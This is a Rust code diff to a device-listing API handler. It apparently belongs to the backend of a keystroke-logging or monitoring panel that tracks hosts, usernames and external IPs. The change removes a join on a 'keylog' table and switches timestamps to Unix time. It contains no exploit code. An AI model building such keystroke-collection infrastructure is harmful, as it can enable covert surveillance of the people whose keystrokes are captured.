@@ -38,15 +38,14 @@ pub struct DeviceSummary {
     pub os: Option<String>,
     pub os_version: Option<String>,
     pub is_online: bool,
-    pub last_seen: String,
-    pub upload_count: i64,
+    pub last_seen: i64,
 }
 
 async fn list_devices(
     State(state): State<AppState>,
     _claims: Claims,
 ) -> Result<Json<Vec<DeviceSummary>>, (StatusCode, Json<ErrorResponse>)> {
-    // Fetch base device data + upload count (keylog rows = uploads)
+    // Fetch base device data
     let rows = sqlx::query!(
         r#"
         SELECT
@@ -56,10 +55,8 @@ async fn list_devices(
             d.ip_external,
             d.os           AS "os: String",
             d.os_version,
-            d.last_seen,
-            COUNT(k.id)    AS upload_count
+            UNIX_TIMESTAMP(d.last_seen) as last_seen
         FROM devices d
-        LEFT JOIN keylog k ON k.device_id = d.device_id
         GROUP BY
             d.device_id, d.hostname, d.username, d.ip_external,
             d.os, d.os_version, d.last_seen
@@ -95,8 +92,7 @@ async fn list_devices(
             ip_external: r.ip_external,
             os: r.os,
             os_version: r.os_version,
-            last_seen: r.last_seen.to_string(),
-            upload_count: r.upload_count,
+            last_seen: r.last_seen,
         })
         .collect();
 
